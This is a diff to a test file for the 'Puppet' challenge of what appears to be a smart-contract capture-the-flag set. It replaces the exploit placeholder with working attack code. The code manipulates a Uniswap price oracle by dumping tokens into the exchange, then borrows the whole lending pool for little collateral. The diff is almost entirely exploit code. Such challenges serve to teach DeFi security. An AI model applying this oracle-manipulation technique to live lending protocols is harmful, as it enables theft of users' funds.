@@ -102,7 +102,15 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+    
+	const deadline = (await web3.eth.getBlock('latest')).timestamp*2;
+	await this.token.connect(attacker).approve(
+		this.uniswapExchange.address,
+		ATTACKER_INITIAL_TOKEN_BALANCE
+	);
+	// Skew the 2:1 collateral rate to less than 1:1, by changing the exchange Token balance
+	await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), 1, deadline);    
+	await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ATTACKER_INITIAL_ETH_BALANCE });  
     });
 
     after(async function () {
